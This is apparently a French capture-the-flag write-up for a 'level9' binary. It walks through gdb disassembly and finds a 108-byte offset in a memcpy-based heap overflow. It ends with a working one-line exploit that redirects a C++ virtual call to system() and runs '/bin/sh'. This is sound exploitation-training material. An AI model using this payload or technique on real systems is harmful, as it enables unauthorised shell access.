On se connecte sur le level9, ou se trouve un **binaire** <code>level9</code>.

On cherche a savoir ce que fait ce binaire:

```gdb
> gdb -q level9
Reading symbols from /home/user/level9/level9...(no debugging symbols found)...done.
(gdb) > disas main
Dump of assembler code for function main:
   0x080485f4 <+0>:     push   %ebp
   0x080485f5 <+1>:     mov    %esp,%ebp
   0x080485f7 <+3>:     push   %ebx
   0x080485f8 <+4>:     and    $0xfffffff0,%esp
   0x080485fb <+7>:     sub    $0x20,%esp
   0x080485fe <+10>:    cmpl   $0x1,0x8(%ebp)
   0x08048602 <+14>:    jg     0x8048610 <main+28>
   0x08048604 <+16>:    movl   $0x1,(%esp)
   0x0804860b <+23>:    call   0x80484f0 <_exit@plt>
   0x08048610 <+28>:    movl   $0x6c,(%esp)
   0x08048617 <+35>:    call   0x8048530 <_Znwj@plt>
   0x0804861c <+40>:    mov    %eax,%ebx
   0x0804861e <+42>:    movl   $0x5,0x4(%esp)
   0x08048626 <+50>:    mov    %ebx,(%esp)
   0x08048629 <+53>:    call   0x80486f6 <_ZN1NC2Ei>
   0x0804862e <+58>:    mov    %ebx,0x1c(%esp)
   0x08048632 <+62>:    movl   $0x6c,(%esp)
   0x08048639 <+69>:    call   0x8048530 <_Znwj@plt>
   0x0804863e <+74>:    mov    %eax,%ebx
   0x08048640 <+76>:    movl   $0x6,0x4(%esp)
   0x08048648 <+84>:    mov    %ebx,(%esp)
   0x0804864b <+87>:    call   0x80486f6 <_ZN1NC2Ei>
   0x08048650 <+92>:    mov    %ebx,0x18(%esp)
   0x08048654 <+96>:    mov    0x1c(%esp),%eax
   0x08048658 <+100>:   mov    %eax,0x14(%esp)
   0x0804865c <+104>:   mov    0x18(%esp),%eax
   0x08048660 <+108>:   mov    %eax,0x10(%esp)
   0x08048664 <+112>:   mov    0xc(%ebp),%eax
   0x08048667 <+115>:   add    $0x4,%eax
   0x0804866a <+118>:   mov    (%eax),%eax
   0x0804866c <+120>:   mov    %eax,0x4(%esp)
   0x08048670 <+124>:   mov    0x14(%esp),%eax
   0x08048674 <+128>:   mov    %eax,(%esp)
   0x08048677 <+131>:   call   0x804870e <_ZN1N13setAnnotationEPc>
   0x0804867c <+136>:   mov    0x10(%esp),%eax
   0x08048680 <+140>:   mov    (%eax),%eax
   0x08048682 <+142>:   mov    (%eax),%edx
   0x08048684 <+144>:   mov    0x14(%esp),%eax
   0x08048688 <+148>:   mov    %eax,0x4(%esp)
   0x0804868c <+152>:   mov    0x10(%esp),%eax
   0x08048690 <+156>:   mov    %eax,(%esp)
   0x08048693 <+159>:   call   *%edx
   0x08048695 <+161>:   mov    -0x4(%ebp),%ebx
   0x08048698 <+164>:   leave
   0x08048699 <+165>:   ret
End of assembler dump.

(gdb) > i functions
All defined functions:

Non-debugging symbols:
0x08048464  _init
0x080484b0  __cxa_atexit
0x080484b0  __cxa_atexit@plt
0x080484c0  __gmon_start__
0x080484c0  __gmon_start__@plt
0x080484d0  std::ios_base::Init::Init()
0x080484d0  _ZNSt8ios_base4InitC1Ev@plt
0x080484e0  __libc_start_main
0x080484e0  __libc_start_main@plt
0x080484f0  _exit
0x080484f0  _exit@plt
0x08048500  _ZNSt8ios_base4InitD1Ev
0x08048500  _ZNSt8ios_base4InitD1Ev@plt
0x08048510  memcpy
0x08048510  memcpy@plt
0x08048520  strlen
0x08048520  strlen@plt
0x08048530  operator new(unsigned int)
0x08048530  _Znwj@plt
0x08048540  _start
0x08048570  __do_global_dtors_aux
0x080485d0  frame_dummy
0x080485f4  main
0x0804869a  __static_initialization_and_destruction_0(int, int)
0x080486da  _GLOBAL__sub_I_main
0x080486f6  N::N(int)
0x080486f6  N::N(int)
0x0804870e  N::setAnnotation(char*)
0x0804873a  N::operator+(N&)
0x0804874e  N::operator-(N&)
0x08048770  __libc_csu_init
0x080487e0  __libc_csu_fini
0x080487e2  __i686.get_pc_thunk.bx
0x080487f0  __do_global_ctors_aux
0x0804881c  _fini
```

Apres analyse du fichier (\*\*source.c\*\*), on se rend compte que le programme appel la fonction **memcpy** que nous pourront exploit.
On commence par trouver l'offset

```gdb
(gdb) > b *main+136
Breakpoint 1 at 0x804867c
(gdb) > b *main+140
Breakpoint 2 at 0x8048680
(gdb) > b *main+142
Breakpoint 3 at 0x8048682
(gdb) > run AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKKLLLLMMMMNNNNOOOOPPPPQQQQRRRRSSSSTTTTUUUUVVVVWWWWXXXXYYYYZZZZaaaabbbbccccddddeeeeffffgggghhhhiiiijjjjkkkkllllmmmmnnnnooooppppqqqqrrrrssssttttuuuuvvvvwwwwxxxxyyyyzzzz
Starting program: /home/user/level9/level9 AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKKLLLLMMMMNNNNOOOOPPPPQQQQRRRRSSSSTTTTUUUUVVVVWWWWXXXXYYYYZZZZaaaabbbbccccddddeeeeffffgggghhhhiiiijjjjkkkkllllmmmmnnnnooooppppqqqqrrrrssssttttuuuuvvvvwwwwxxxxyyyyzzzz

Breakpoint 1, 0x0804867c in main ()
(gdb) > p $eax
$1 = 134520844
(gdb) > p/x $eax
$2 = 0x804a00c
(gdb) > x $eax
0x804a00c:      0x41414141
(gdb) > s
Single stepping until exit from function main,
which has no line number information.

Breakpoint 2, 0x08048680 in main ()
(gdb) > x $eax
0x804a078:      0x62626262
(gdb) > s
Single stepping until exit from function main,
which has no line number information.

Breakpoint 3, 0x08048682 in main ()
(gdb) > x $eax
0x62626262:     Cannot access memory at address 0x62626262
(gdb) > p 0x62
$3 = 98
```

98 correspond à la valeur ascii de 'b', on a donc **overflow**à partir des 'b', nous avons donc passé 27 * 4 lettres, ce qui correspond a un **offset** de 108.

> OFFSET = 108

Regardont ce qu'il se passe au retour de la fonction

```gdb
(gdb) > d 1
(gdb) > d 2
(gdb) > d 3
(gdb) > b *main+136
Breakpoint 4 at 0x804867c
(gdb) > b *main+140
Breakpoint 5 at 0x8048680
(gdb) > b *main+142
Breakpoint 6 at 0x8048682
(gdb) > run
The program being debugged has been started already.
Start it from the beginning? (y or n) > y

Starting program: /home/user/level9/level9 AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKKLLLLMMMMNNNNOOOOPPPPQQQQRRRRSSSSTTTTUUUUVVVVWWWWXXXXYYYYZZZZaaaabbbbccccddddeeeeffffgggghhhhiiiijjjjkkkkllllmmmmnnnnooooppppqqqqrrrrssssttttuuuuvvvvwwwwxxxxyyyyzzzz

Breakpoint 4, 0x0804867c in main ()
(gdb) > x $eax
0x804a00c:      0x41414141
(gdb) > ni

Breakpoint 5, 0x08048680 in main ()
(gdb) > x $eax
0x804a078:      0x62626262
(gdb) > ni

Breakpoint 6, 0x08048682 in main ()
(gdb) > x $eax
0x62626262:     Cannot access memory at address 0x62626262
(gdb)
```

On remarque que en premier lieu, notre eax pointe sur nos 'A' et que nous possédons l'adresse, et que par jeu de pointeur, 2 instructions après, nous pouvons voir que la valeur de l'addresse contenu dans eax est copier dans edx (dans notre exemple, la valeur copier est celle de nos 'b'). Nous pouvons également constater que par la suite, l'instruction situé à l'adresse contenue dans edx est call. 
Nous pouvons donc insérer l'addresse de system au niveaux de nos 'A'.
Nous pouvons indiquer l'addresse de notre insertion au niveau de nos 'b' pour qu'elle soit exécuté par le call. Les arguments lu dans la mémoire seront  les octets suivant nos 'b'. 

```gdb
(gdb) b main
Breakpoint 1 at 0x80485f8
(gdb) run
Starting program: /home/user/level9/level9

Breakpoint 1, 0x080485f8 in main ()
(gdb) p *system
$1 = {<text variable, no debug info>} 0xb7d86060 <system>
```

> SYSTEM = 0xb7d86060


```bash
> ./level9 `python -c 'print "\x60\x60\xd8\xb7" + "A"*104 + "\x0c\xa0\x04\x08;/bin/sh"'`
```